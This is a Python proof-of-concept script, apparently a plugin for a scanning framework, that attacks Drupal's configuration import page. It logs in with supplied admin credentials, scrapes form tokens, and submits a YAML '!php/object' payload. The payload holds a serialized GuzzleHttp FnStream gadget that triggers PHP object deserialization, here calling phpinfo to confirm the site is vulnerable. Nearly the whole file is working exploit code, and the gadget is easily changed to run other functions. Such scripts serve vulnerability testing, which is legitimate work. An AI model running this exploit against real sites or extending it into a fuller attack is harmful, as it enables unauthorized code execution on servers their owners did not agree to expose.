import re

import requests

from lib.core.data import target


def poc():
    try:
        if not target.url.endswith("configuration/single/import/"):
            print(
                "[*] Please make sure the url end with 'admin/config/development/configuration/single/import/'"
            )
            exit()
        # log in

        username = raw_input("[*] Input the admin username: ")
        password = raw_input("[*] Input the admin password: ")
        loginurl = target.url.replace(
            "admin/config/development/configuration/single/import/",
            "user/login")
        print("[*] The login url: " + loginurl)

        # get form-id
        loginhtml = requests.get(loginurl).text
        p1 = re.compile("(?<=name=\"form_build_id\" value=\")(.*)(?=\")")
        formuserid = re.search(p1, loginhtml).group(0)
        print("[*] The form-id : " + formuserid)

        # try log in
        payload1 = {
            "name": username,
            "pass": password,
            "formuserid": formuserid,
            "form_id": "user_login_form",
            "op": "Log in"
        }
        proxy = {"http": "http://10.10.10.128:8080"}
        login = requests.post(loginurl, data=payload1, allow_redirects=False)

        if login.status_code == 303:
            logincookie = login.cookies
            print("[*] Login successfully.")
        else:
            print("[*] The username or password is wrong. Login failed.")
            raise KeyError

        importhtml = requests.get(target.url, cookies=logincookie).text
        adminformid = re.search(p1, importhtml).group(0)
        print("[*] The admin form-id : " + adminformid)
        p2 = re.compile("(?<=name=\"form_token\" value=\")(.*)(?=\")")
        adminformtoken = re.search(p2, importhtml).group(0)
        print("[*] The admin form-token : " + adminformtoken)

        exp = '!php/object "O:24:\\"GuzzleHttp\\\\Psr7\\\\FnStream\\":2:{s:33:\\"\\0GuzzleHttp\\\\Psr7\\\\FnStream\\0methods\\";a:1:{s:5:\\"close\\";s:7:\\"phpinfo\\";}s:9:\\"_fn_close\\";s:7:\\"phpinfo\\";}"'

        payload2 = {
            "config_type": "system.simple",
            "config_name": "test",
            "import": exp,
            "custom_entity_id": "",
            "form_build_id": adminformid,
            "form_token": adminformtoken,
            "form_id": "config_single_import_form",
            "op": "Import"
        }

        exphtml = requests.post(
            target.url, data=payload2, cookies=logincookie).text
        if exphtml.find("phpinfo()") > 0:
            print("[*] The site is vulnable!")
        else:
            raise KeyError
    except KeyError as e:
        print(
            "\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"
        )
